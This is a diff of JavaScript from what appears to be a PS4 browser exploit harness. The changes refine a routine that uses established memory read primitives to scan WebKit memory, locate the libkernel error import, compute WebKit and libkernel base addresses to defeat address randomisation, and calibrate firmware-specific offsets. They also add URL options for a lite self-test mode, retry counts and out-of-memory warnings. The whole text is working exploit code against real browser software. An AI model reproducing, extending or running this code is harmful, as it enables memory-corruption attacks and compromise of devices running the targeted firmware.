@@ -96,34 +96,31 @@ function findWebkitBase(p, nativeFn) {
     return null;
 }
 
-function findErrorImport(p, webkitBase, nativeFn) {
+function findErrorImport(p, webkitBase, hintRva) {
     const lo = webkitBase.low;
     const hi = webkitBase.hi;
-    const end = 0x04000000;
-    for (let rva = 0; rva < end; rva += 8) {
-        let slot;
-        try {
-            slot = webkitBase.add32(rva);
-        } catch (_) {
-            break;
-        }
-        let ptr;
-        try {
-            ptr = p.read8(slot);
-        } catch (_) {
-            continue;
-        }
-        if (ptr.hi <= hi || ptr.hi > hi + 4) continue;
-        for (const kErr of [0x26420, 0xd9d0, 0x3370]) {
-            const lk = ptr.sub32(kErr);
-            if (!alignedModuleBase(lk)) continue;
+    const windows = hintRva
+        ? [[Math.max(0, hintRva - 0x200000), hintRva + 0x200000]]
+        : [[0x3800000, 0x3d00000], [0, 0x0200000]];
+    for (const [start, end] of windows) {
+        for (let rva = start; rva < end; rva += 8) {
+            let ptr;
             try {
-                const w0 = p.read4(lk).low;
-                const w1 = p.read4(lk.add32(4)).low;
-                // mov eax, imm32 ; syscall  (common libkernel stub head)
-                if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
-                    return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
-            } catch (_) { }
+                ptr = p.read8(webkitBase.add32(rva));
+            } catch (_) {
+                continue;
+            }
+            if (ptr.hi <= hi || ptr.hi > hi + 4) continue;
+            for (const kErr of [0x26420, 0xd9d0, 0x3370]) {
+                const lk = ptr.sub32(kErr);
+                if (!alignedModuleBase(lk)) continue;
+                try {
+                    const w0 = p.read4(lk).low;
+                    const w1 = p.read4(lk.add32(4)).low;
+                    if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
+                        return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
+                } catch (_) { }
+            }
         }
     }
     return null;
@@ -143,7 +140,7 @@ function calibrateOffsets(p, off) {
     mark("CAL-WK-BASE", String(wk.base));
     mark("CAL-wk_expm1_builtin", "0x" + wk.wk_expm1_builtin.toString(16));
 
-    const err = findErrorImport(p, wk.base, nativeFn);
+    const err = findErrorImport(p, wk.base, off.wk___imp___error);
     if (err) {
         mark("CAL-wk___imp___error", "0x" + err.wk___imp___error.toString(16));
         mark("CAL-k__error", "0x" + err.k__error.toString(16));
@@ -164,10 +161,18 @@ async function run() {
     const detected = offsetsFor(navigator.userAgent);
     const offKey = params.get("fw") || detected.key || "13.00";
     const { off } = offsetsForKey(offKey);
+    const lite = params.get("lite") === "1";
+    const maxAttempts = Math.max(1, parseInt(params.get("attempts") || "1", 10) || 1);
+    const doCalibrate = params.get("calibrate") === "1";
+
     mark("UA", navigator.userAgent);
     mark("UA-FW", detected.key || "unknown");
     mark("OFFSETS-FW", offKey + (detected.key && detected.key !== offKey
         ? " (forced; UA reports " + detected.key + ")" : ""));
+    if (lite)
+        mark("MODE", "lite — primitive self-test only, no calibrate/offset scans");
+    mark("MEM-TIP", "OOM? close browser fully, reopen, use ?attempts=1 (default) "
+        + "never ?pair=1, optional ?g=drain:384");
     if (!off)
         throw new Error("no offset table for fw=" + offKey);
     mark("OFFSETS", off.fw_status || "loaded");
@@ -178,14 +183,16 @@ async function run() {
 
     state("establishing primitive...", "warn");
 
-    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
+    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;
     const carrier = await establishPrimitive({
-        maxAttempts: 6,
+        maxAttempts,
         onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})
             (t, (a != null ? "[" + a + "] " : "") + (d || ""))
     });
 
     const PAIR_ON = params.get("pair") === "1";
+    if (PAIR_ON)
+        mark("MEM-WARN", "pair=1 releases ~137MB garbage — high OOM risk on PS4 browser");
     installWindowP(carrier, {
         promote: PAIR_ON,
         onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
@@ -231,11 +238,11 @@ async function run() {
         return ok;
     }
 
-    const backing = findArrayBufferBacking(p, probe, 0xdeadbeef);
-    if (backing)
-        mark("AB-BACKING", backing.label + " -> " + backing.ptr);
+    if (!lite && off) {
+        const backing = findArrayBufferBacking(p, probe, 0xdeadbeef);
+        if (backing)
+            mark("AB-BACKING", backing.label + " -> " + backing.ptr);
 
-    if (off) {
         const dataPtr = backing ? backing.ptr : bufAddr(p, off, probe);
         checkOffset("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
         const got = p.read4(dataPtr);
@@ -249,23 +256,25 @@ async function run() {
                 "view[0]=" + view[0].toString(16));
             view[0] = 0xdeadbeef;
         }
+
+        if (off.wk_expm1_builtin) {
+            const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function);
+            const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+            const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+            const libkernelBase = errorFn.sub32(off.k__error);
+            mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
+                + " nativeFn=" + nativeFn);
+            checkOffset("module-bases-0x4000-aligned",
+                alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
+        }
+    } else if (lite) {
+        mark("SKIP", "offset/arraybuffer tests (lite=1)");
     }
 
-    if (off.wk_expm1_builtin) {
-        const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function);
-        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-        const libkernelBase = errorFn.sub32(off.k__error);
-        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
-            + " nativeFn=" + nativeFn);
-        checkOffset("module-bases-0x4000-aligned",
-            alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
-    }
-
-    if (params.get("calibrate") === "1" || crossFw) {
+    if (doCalibrate && !lite) {
         const live = calibrateOffsets(p, off);
         if (live && live.wk_expm1_builtin != null) {
-            mark("PASTE-13.52", JSON.stringify({
+            mark("PASTE-OFFSETS", JSON.stringify({
                 fw_status: "calibrated on hardware",
                 wk_expm1_builtin: live.wk_expm1_builtin,
                 wk_JSFunction_m_function: live.wk_JSFunction_m_function,
